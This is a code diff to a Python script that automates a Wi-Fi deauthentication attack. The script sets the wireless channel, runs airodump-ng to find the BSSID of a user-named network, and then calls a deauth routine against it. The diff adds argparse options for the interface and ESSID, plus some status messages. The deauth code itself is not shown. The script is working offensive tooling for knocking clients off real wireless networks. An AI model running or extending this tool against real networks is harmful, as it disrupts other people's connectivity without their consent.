@@ -1,4 +1,4 @@
-import subprocess, time, sys
+import subprocess, time, sys, argparse
 
 
 
@@ -26,9 +26,7 @@ def iwCh( channel, interface ):
 
         subprocess.run( f"sudo iwconfig { interface } channel { channel }", shell = True, check = True )
 
-        print( f"\n{ green }Channel is set to { channel } on { interface }!" )
-
-        time.sleep( 2 )
+        print( f"\n\n{ green }Channel is set to { channel } on { interface }!\n\n" )
 
     except:
 
@@ -86,7 +84,7 @@ def air( IF, ESSID ):
 
     try:
 
-        f = open( "wifiInterF.txt", "x" )
+        f = open( "wifiInterF.txt", "w" )
 
     except:
 
@@ -95,6 +93,8 @@ def air( IF, ESSID ):
         sys.exit( 0 )
 
     p = subprocess.Popen( [ "sudo", "airodump-ng", "-i", IF ], stdout = f )
+
+    print( f"\n\n{ green }Capture file is being created. Please wait!\n\n" )
 
     time.sleep( 10 )
 
@@ -146,4 +146,29 @@ def air( IF, ESSID ):
 
     kiddDeAuth( dic[ "bssid" ], IF )
 
-air( str( input( f"\n{ green }Interface ( wlan0, wlan0mon, etc... ) : \n" ) ), str( input( f"\n{ green }ESSID or wifi name : \n" ) ) )
+
+
+
+
+
+
+
+
+def main():
+
+    parser = argparse.ArgumentParser( description = "How to use?" )
+
+    parser.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )
+
+    parser.add_argument( "-e", "--essid", type = str, required = True, help = "ESSID or wifi name" )
+
+    arg = parser.parse_args()
+
+    air( arg.interface, arg.essid )
+
+if __name__ == "__main__":
+
+    main()
+
+
+
